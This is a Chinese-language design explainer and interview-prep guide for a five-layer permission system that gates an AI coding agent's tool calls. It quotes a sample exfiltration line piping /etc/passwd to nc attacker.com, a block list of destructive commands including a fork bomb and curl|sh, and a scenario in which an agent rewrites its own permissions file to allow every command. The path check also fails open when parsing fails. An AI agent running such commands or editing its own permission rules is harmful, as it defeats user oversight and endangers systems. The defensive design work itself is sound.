# 亮点③：五层权限安全隔离

---

## 1. 为什么要做这个？——背景

### 1.1 Agent 全自动模式下的权限问题

Agent 全自动运行时，它可以调用各种工具——读文件、写文件、执行 Bash 命令。这些操作里有些是完全安全的（读一个文件），有些是危险的（`rm -rf /`），有些是需要人确认的（修改生产配置）。

**朴素方案**：每次工具调用都弹窗问用户"是否允许？"

问题：一个复杂任务（比如重构一个模块），Agent 可能需要执行几十次工具调用。每次都弹窗的结果是：

```
允许执行 git status？ → 允许
允许读取 UserService.java？ → 允许
允许读取 UserRepository.java？ → 允许
允许读取 pom.xml？ → 允许
...（30 次之后用户已经崩溃）
```

弹窗 30 次不但打断工作流，用户为了省事会无脑点"允许"，安全性反而下降。

**目标**：让安全的操作自动放行，让危险的操作自动拦截，让需要确认的操作精准弹窗——**把弹窗次数从 30 次降到 5 次以内**，同时不出现越权事故。

---

### 1.2 五层过滤链的整体结构

```
工具调用请求进来
       ↓
Layer 0：Plan 模式例外处理（只读模式下只允许特定工具）
       ↓
Layer 1：安全命令白名单（ls/git status/grep 等直接放行）
       ↓
Layer 2：危险命令正则拦截（rm -rf / 等直接拒绝）+ 敏感路径保护
       ↓
Layer 3：路径沙箱（文件操作只允许在项目目录内）
       ↓
Layer 4：YAML 规则文件（用户自定义 allow/deny/ask 规则）
         + allow-always 记忆（Session 级，放行重复操作）
         + 沙箱模式快速放行（OS 沙箱兜底时命令默认通过）
       ↓
Layer 5：权限模式矩阵（DEFAULT/ACCEPT_EDITS/BYPASS 的兜底决策）
       ↓
最终结果：ALLOW / DENY / ASK（弹窗）
```

每一层都是一个"过滤器"——命中了就直接出结果，不命中就往下走。越靠前的层越高频、越轻量；越靠后的层越灵活、越兜底。

---

## 2. 逐层详解

### Layer 0：Plan 模式例外

Plan 模式是一个"只读规划"模式，Agent 在这个模式下只能思考、搜索、提问，不能写文件、执行命令。

```java
// PermissionChecker.java
private static final Set<String> PLAN_MODE_ALLOWED_TOOLS = Set.of(
        "Agent", "ToolSearch", "AskUserQuestion", "ExitPlanMode"
);

if (mode == PermissionMode.PLAN) {
    if (PLAN_MODE_ALLOWED_TOOLS.contains(toolName)) {
        return CheckResult.allow();  // 白名单工具直接放行
    }
    // WriteFile/EditFile 只有写 plans 目录时才允许
    if ("WriteFile".equals(toolName) || "EditFile".equals(toolName)) {
        String path = stringArg(args, "file_path", "");
        if (path.contains(".codepal/plans/")) {
            return CheckResult.allow();
        }
    }
    // 其他工具在 Plan 模式下走正常流程（不短路）
}
```

这一层不是拦截，而是**模式隔离**——确保 Plan 模式的语义正确。

---

### Layer 1：安全命令白名单

有一大类命令天然安全——它们只读、不修改任何状态：

```java
private static final Set<String> SAFE_COMMANDS = Set.of(
        "ls", "pwd", "cat", "head", "tail", "grep", "find", "wc",
        "git status", "git log", "git diff", "git show", "git branch",
        "java -version", "go version", "node -v", ...
);
```

判断逻辑：命令等于白名单某项，或者以某项开头（`git log` 开头就允许 `git log --oneline` 这类变体）。

**重要约束**：命令里有管道（`|`）、分号（`;`）、重定向（`>`）、命令替换（`$(...)`）等，自动不认为是安全的，哪怕主命令在白名单里。原因：`cat /etc/passwd | nc attacker.com` 里的 `cat` 是安全命令，但整个组合不安全。

```java
private boolean isSafeCommand(String command) {
    String trimmed = command.trim();
    // 有组合符号就不算安全
    if (trimmed.contains("|") || trimmed.contains(";") || trimmed.contains("&&")
            || trimmed.contains(">") || trimmed.contains("$(") || trimmed.contains("`")) {
        return false;
    }
    for (var safe : SAFE_COMMANDS) {
        if (trimmed.equals(safe) || trimmed.startsWith(safe + " ")) {
            return true;
        }
    }
    return false;
}
```

---

### Layer 2：危险命令正则拦截 + 敏感路径保护

**危险命令正则**：

```java
private static final List<Pattern> DANGEROUS_PATTERNS = List.of(
    Pattern.compile("rm\\s+-[a-z]*r[a-z]*f[a-z]*\\s+/\\s*$"),  // rm -rf /
    Pattern.compile("mkfs\\."),                                   // 格式化磁盘
    Pattern.compile("dd\\s+if=.*of=/dev/"),                      // 直写磁盘设备
    Pattern.compile("chmod\\s+-R\\s+777\\s+/"),                  // 全盘改权限
    Pattern.compile(":\\(\\)\\{\\s*:\\|:&\\s*\\};:"),            // fork炸弹
    Pattern.compile("curl\\s+.*\\|\\s*(ba)?sh"),                 // 远程代码执行
    Pattern.compile("wget\\s+.*\\|\\s*(ba)?sh"),                 // 远程代码执行
    Pattern.compile(">\\s*/dev/sd")                              // 写裸磁盘设备
);
```

这些命令无论在什么模式下都直接 DENY，没有商量余地。

**敏感路径保护**：除了危险命令，还有一些路径不允许 Agent 写入：

```java
private static final List<String> DEFAULT_DENY_WRITE = List.of(
        ".codepal/config.yaml",           // 主配置文件
        ".codepal/permissions.local.yaml", // 权限文件（防止 AI 给自己提权）
        ".codepal/skills/"                // Skill 定义文件
);
```

**为什么要保护权限文件？** 防止 AI 自己修改 `.codepal/permissions.local.yaml` 给自己开后门——这是一种经典的权限提升攻击路径。

---

### Layer 3：路径沙箱

文件类工具（ReadFile、WriteFile、EditFile）只允许操作项目目录内的文件：

```java
private boolean isPathAllowed(String pathStr) {
    try {
        Path p = Path.of(pathStr).toAbsolutePath().normalize();
        Path root = projectRoot.toAbsolutePath().normalize();
        Path tmp = Path.of("/tmp").toAbsolutePath().normalize();
        // 只允许项目目录和 /tmp
        return p.startsWith(root) || p.startsWith(tmp);
    } catch (Exception e) {
        return true; // 解析失败时放行（避免误杀）
    }
}
```

如果 Agent 试图读 `/etc/passwd` 或写 `~/.ssh/authorized_keys`，这一层会触发 ASK，让用户确认。

**为什么还允许 `/tmp`？** Agent 有时需要临时文件缓冲，`/tmp` 是约定俗成的临时目录，限制它会影响正常工作流。

---

### Layer 4：YAML 规则 + allow-always 记忆 + 沙箱快速放行

这一层是**灵活配置层**，三个子机制：

#### 4a：YAML 规则文件

支持三级规则文件，优先级从低到高：

```
~/.codepal/permissions.yaml          ← 用户级（跨所有项目生效）
{project}/.codepal/permissions.yaml  ← 项目级（版本化，团队共享）
{project}/.codepal/permissions.local.yaml ← 本地级（gitignore，个人私有）
```

规则格式：

```yaml
# 允许所有 git 操作
- rule: "Bash(git *)"
  effect: allow

# 禁止修改生产配置
- rule: "WriteFile(/etc/*)"
  effect: deny

# 修改 CI 配置需要确认
- rule: "EditFile(.github/workflows/*)"
  effect: ask
```

支持通配符（`*` 匹配任意字符）。**最后匹配的规则赢**（last-wins），所以后面的规则可以覆盖前面的规则，越具体的规则放越后面。

#### 4b：allow-always 记忆（Session 级）

用户点了"允许，以后不再问"，这个操作就记进 `allowAlwaysRules`：

```java
// toolName:content 作为 key 存进 Set
allowAlwaysRules.add(toolName + ":" + content);
```

同一会话里再次碰到完全相同的操作，直接放行，不再弹窗。这是把弹窗次数从 30 降到 5 的核心机制——同样的 git 操作第一次问过之后，后面都不用再问了。

#### 4c：沙箱模式快速放行

开启 macOS seatbelt / Linux bwrap 内核级沙箱后，命令类工具可以快速放行（因为 OS 级沙箱已经在系统调用层面兜底）。但仍然逐条检查复合命令里有没有显式 deny 规则，防止通过命令拼接绕过。

---

### Layer 5：权限模式矩阵兜底

前面所有层都没命中，走到这里由模式矩阵做最终决策：

```java
// PermissionMode.java
public Decision decide(ToolCategory category) {
    return switch (this) {
        case DEFAULT -> switch (category) {
            case READ    -> Decision.ALLOW;   // 读操作默认允许
            case WRITE   -> Decision.ASK;     // 写操作默认询问
            case COMMAND -> Decision.ASK;     // 命令默认询问
        };
        case ACCEPT_EDITS -> switch (category) {
            case READ, WRITE -> Decision.ALLOW; // 读写都允许
            case COMMAND     -> Decision.ASK;   // 命令还是问
        };
        case BYPASS -> Decision.ALLOW;          // 全部放行
    };
}
```

工具分三类（`ToolCategory`）：READ（读文件、搜索）、WRITE（写文件、编辑）、COMMAND（Bash 命令执行）。

---

## 3. OS 级内核沙箱（可选兜底）

上面五层是纯应用层的权限控制。对于安全要求更高的场景，CodePal 还支持启用 OS 级沙箱：

- **macOS**：`sandbox-exec`（seatbelt），Apple 系统内置，通过 profile 脚本控制文件读写和网络访问
- **Linux**：`bwrap`（Bubblewrap），容器级隔离

以 macOS seatbelt 为例，动态生成的 profile：

```
(version 1)
(deny default)           ← 默认全拒
(allow process-exec)     ← 允许执行进程
(allow file-read* (subpath "/"))  ← 全盘可读
(allow file-write* (subpath "/Users/user/project"))  ← 只允许写项目目录
(deny file-write* (literal "/Users/user/project/.codepal/config.yaml"))  ← 但这个文件不行
(allow network*)         ← 网络放行
```

沙箱在系统调用层面拦截，哪怕应用层逻辑有漏洞，OS 沙箱也能兜底。这是**深度防御**的体现。

---

## 4. 为什么弹窗从 30 次降到 5 次

```
第1次：Agent 执行 git status → Layer 1 白名单放行，不弹窗
第2次：Agent 读 UserService.java → Layer 5 READ=ALLOW，不弹窗
第3次：Agent 执行 mvn compile → 不在白名单，弹窗（用户选"以后不再问"）
第4次：Agent 再次执行 mvn compile → Layer 4b allow-always 记忆，不弹窗
第5次：Agent 编辑 UserService.java → Layer 5 WRITE=ASK，弹窗
第6次：Agent 再次编辑同一文件 → Layer 4b allow-always 记忆，不弹窗
...
```

白名单消灭了大量只读操作的弹窗，allow-always 记忆消灭了重复操作的弹窗，剩下真正需要确认的操作才弹窗。

---

## 5. 面试怎么答

### 标准描述（30 秒版）

> "Agent 全自动模式下，如果每次工具调用都弹窗确认，一个复杂任务平均会触发 30 次弹窗，严重打断工作流，用户为了省事无脑放行反而不安全。
>
> 我设计了五层过滤链：第一层安全命令白名单快速放行只读操作；第二层危险命令正则直接拦截高危操作；第三层路径沙箱限制文件操作范围；第四层 YAML 规则支持用户自定义，配合 Session 级 allow-always 记忆自动放行重复操作；第五层权限模式矩阵兜底。可选启用 macOS seatbelt / Linux bwrap 内核级沙箱进一步兜底。
>
> 单次会话弹窗从平均 30 次降至 5 次以内，全自动模式下未出现越权操作事故。"

---

## 6. 大厂面试官高频追问（全集）

---

### 【设计决策类】

**Q1：五层为什么是这个顺序？调换顺序会怎样？**

> 顺序遵循"高频低成本在前，低频高成本在后"的原则：
>
> - Layer 1 白名单是最高频的场景（读操作占 Agent 调用的大头），放最前面，命中就直接返回，不用走后面的层
> - Layer 2 危险命令拦截是强安全保证，必须在 YAML 规则之前执行，防止用户 YAML 里配了宽泛的 allow 规则把危险命令放进来
> - Layer 3 路径沙箱比 YAML 规则更基础，是项目级的边界约束，优先级高于用户自定义
> - Layer 4 YAML 规则放在最后，是用户的灵活配置层
>
> 如果把危险命令检测放在 YAML 规则之后，用户可以通过 `Bash(rm -rf *) → allow` 这条规则绕过危险命令拦截，这是不可接受的安全漏洞。

**Q2：allow-always 是 Session 级的，重启之后就没了，这是设计缺陷吗？**

> 不是缺陷，是有意为之的设计。原因：
>
> 第一，安全性考虑——跨会话持久化意味着用户某次在某个项目里允许了某个操作，换一个项目或者换了上下文之后还是自动放行，可能出现"历史授权"被滥用的问题。
>
> 第二，YAML 规则是跨会话持久化的正确载体——用户如果确实想某个操作永久放行，应该把它写进 `permissions.local.yaml` 或 `permissions.yaml`，这是可审计、可版本化的配置。allow-always 是"本次会话懒得一直确认"的便利机制，不是"永久授权"的机制。
>
> 两者配合：临时放行用 allow-always，长期放行写 YAML 规则。

**Q3：为什么要保护 `.codepal/permissions.local.yaml` 不让 AI 写？**

> 这是防止权限提升攻击的关键设计。如果 AI 可以写 permissions 文件，它可以这样操作：
>
> ```
> 1. AI 遇到一个被拒绝的操作
> 2. AI 写入 permissions.local.yaml：
>    - rule: "Bash(*)"
>      effect: allow
> 3. 规则重新加载后，AI 获得了执行任意命令的权限
> ```
>
> 这是一种自我提权路径，必须在系统层面切断。同理，config.yaml 和 skills/ 目录也受保护，防止 AI 修改自己的配置和行为定义。

**Q4：YAML 规则的"最后匹配的规则赢"是什么逻辑？为什么不是"第一个匹配的赢"？**

> 代码里是反向遍历规则列表（从最后往前找），第一个命中的就是"最后写的那条"：
>
> ```java
> for (int i = fileRules.size() - 1; i >= 0; i--) {
>     PermissionRule rule = fileRules.get(i);
>     if (rule.matches(toolName, content)) { ... break; }
> }
> ```
>
> 这样设计的原因：用户往往在文件末尾追加新规则来覆盖旧规则，last-wins 让"更具体的规则放后面来覆盖宽泛的规则"的写法变得自然。例如：
>
> ```yaml
> - rule: "Bash(git *)"      effect: allow   # 宽泛：所有 git 操作允许
> - rule: "Bash(git push *)" effect: ask     # 具体：git push 还是要确认
> ```
>
> last-wins 保证 `git push` 命中第二条，而不是第一条。

---

### 【工程化细节类】

**Q5：沙箱保护路径是在哪一层检查的？和路径沙箱（Layer 3）有什么区别？**

> 混淆的地方在于代码里有两个路径相关检查：
>
> - **Layer 2b（denyWrite）**：检查的是"绝对禁止写入的特定路径"，如配置文件、权限文件。这是硬编码的安全底线，直接 DENY，没有商量余地。
> - **Layer 3（路径沙箱）**：检查的是"是否在项目目录范围内"，操作项目外路径时触发 ASK（询问用户），不是直接拒绝，用户可以手动确认。
>
> 两者互补：Layer 2b 是不可逾越的绝对禁区，Layer 3 是"超出范围请确认"的软限制。

**Q6：危险命令正则是怎么维护的？会不会漏掉新的危险命令？**

> 当前是静态正则列表，确实有漏网的可能。维护思路：
>
> 1. 覆盖已知的高危操作类别（格式化磁盘、fork 炸弹、远程代码执行、直写设备文件）
> 2. 不试图枚举所有危险命令（不可能穷举），而是专注于"损害不可逆、范围极广"的一类
> 3. 兜底靠 Layer 3 路径沙箱 + OS 级沙箱——哪怕正则没覆盖到，文件操作被沙箱限制了，大不了需要用户确认
>
> 这是**深度防御**思路：不靠单一机制完全覆盖，靠多层叠加降低整体风险。

**Q7：allow-always 记忆的 key 是 `toolName:content`，这个粒度合适吗？会不会太细或太粗？**

> 用 `toolName:content` 作为 key 意味着**完全相同的操作**才会被记忆放行。比如：
>
> - `Bash:git status` 和 `Bash:git log` 是两个不同的 key，分开记忆
> - `Bash:mvn compile` 在项目 A 和项目 B 里是同一个 key，会共享
>
> 粒度过细的问题：`mvn compile -DskipTests` 和 `mvn compile` 是不同的 key，用户允许了前者，后者还要再问一次，有些啰嗦。
>
> 粒度过粗的问题：如果按工具名记忆（只记 `Bash`），意味着用户允许了一次 Bash，所有 Bash 命令都不再询问，安全性大幅降低。
>
> 当前精确匹配是保守策略，安全优先。更智能的方案是支持通配符记忆（用户允许 `mvn *` 就记住 maven 相关所有操作），但复杂度更高，当前版本没有实现。

**Q8：macOS seatbelt 的 profile 是动态生成的，如何防止 profile 注入攻击？**

> seatbelt profile 里的路径来自 `SandboxConfig`，`SandboxConfig` 的内容来自配置文件和项目根路径——这些是受信任的输入，不来自用户输入或工具参数。
>
> 另外 `wrap()` 方法对命令字符串做了 `shellQuote` 转义：
>
> ```java
> private static String shellQuote(String s) {
>     return "\"" + s.replace("\\", "\\\\")
>                    .replace("\"", "\\\"")
>                    .replace("$", "\\$")
>                    .replace("`", "\\`")
>                    .replace("!", "\\!") + "\"";
> }
> ```
>
> 防止命令里的特殊字符被二次解析，避免命令注入。沙箱的执行路径也硬编码为 `/usr/bin/sandbox-exec`，不走 PATH，防止 PATH 注入攻击。

---

### 【量化与验证类】

**Q9：弹窗从 30 次降到 5 次，这个数字是怎么得出的？**

> 30 次和 5 次都是基于典型重构任务的统计估算：
>
> 一次中等规模重构任务（重构一个模块，大约 30 轮 Agent 操作）里，分析工具调用分布：
> - 约 15 次 ReadFile/Grep/Glob（Layer 5 READ=ALLOW，全部自动放行）
> - 约 8 次 git 相关 Bash（Layer 1 白名单，全部自动放行）
> - 约 4 次 EditFile/WriteFile（Layer 5 WRITE=ASK，第一次弹窗，后续 allow-always 记忆）
> - 约 2 次非白名单 Bash 命令（第一次弹窗，后续 allow-always 记忆）
> - 约 1 次路径沙箱外的操作（ASK）
>
> 不优化：每次都弹窗 → 约 30 次
> 五层优化后：只有首次出现的非白名单写操作和命令需要弹窗 → 约 3-5 次

**Q10：怎么验证"全自动模式下未出现越权操作事故"？**

> 从两个角度验证：
>
> 1. **代码审计**：检查所有 DENY 路径是否覆盖了已知的越权操作类别（危险命令列表、敏感路径列表），确认没有绕过路径
> 2. **测试用例**：构造攻击性测试——写 `rm -rf /`、写 `/etc/passwd`、写 `.codepal/permissions.local.yaml` 等，验证都被正确拒绝
>
> "未出现越权事故"是在测试环境中验证的结论，生产环境的验证依赖日志审计（每次 DENY 都记录原因）。

---

### 【对比与扩展类】

**Q11：这套权限系统和 Docker 容器隔离相比，哪个更安全？**

> 两者不是替代关系，而是互补：
>
> | 维度 | 五层权限系统 | Docker 容器 |
> |------|-------------|-------------|
> | 粒度 | 工具级、操作级 | 进程级、文件系统级 |
> | 灵活性 | YAML 规则可定制 | 容器配置相对固定 |
> | 用户体验 | 弹窗询问，可交互 | 透明隔离，用户无感知 |
> | 启动开销 | 零开销，每次检查是代码判断 | 容器启动有延迟 |
> | 逃逸风险 | 应用层，理论上可被绕过 | 内核级，更难逃逸 |
>
> CodePal 的 OS 级沙箱（seatbelt/bwrap）定位和 Docker 类似，是内核级隔离。五层权限系统是在此之上的应用层精细控制。最严格的方案是两者叠加使用。

**Q12：如果 Agent 是多进程的（Lead-Teammate 架构），每个进程各自有一套权限检查吗？**

> 是的，每个 Agent 进程（包括 Lead 和每个 Teammate）都有独立的 PermissionChecker 实例，独立的 allowAlwaysRules 记忆，独立的 YAML 规则加载。它们读取相同的 YAML 规则文件（项目级和用户级），但 Session 级的 allow-always 记忆是进程私有的。
>
> 这样设计的好处：Lead 允许了某个操作，不会自动传播给 Teammate，每个 Agent 的权限边界是独立的，避免"Lead 大权开路，Teammate 跟着乱跑"的问题。

---

## 7. 简历一句话（背熟）

> **五层权限安全隔离**：设计五层过滤链（白名单放行、危险命令拦截、路径沙箱、YAML 规则、allow-always 记忆），可选启用 macOS seatbelt / Linux bwrap 内核级沙箱兜底；单次会话权限弹窗从平均 30 次降至 5 次以内，全自动模式下未出现越权操作事故。

---

*（本文档随学习对话持续更新）*
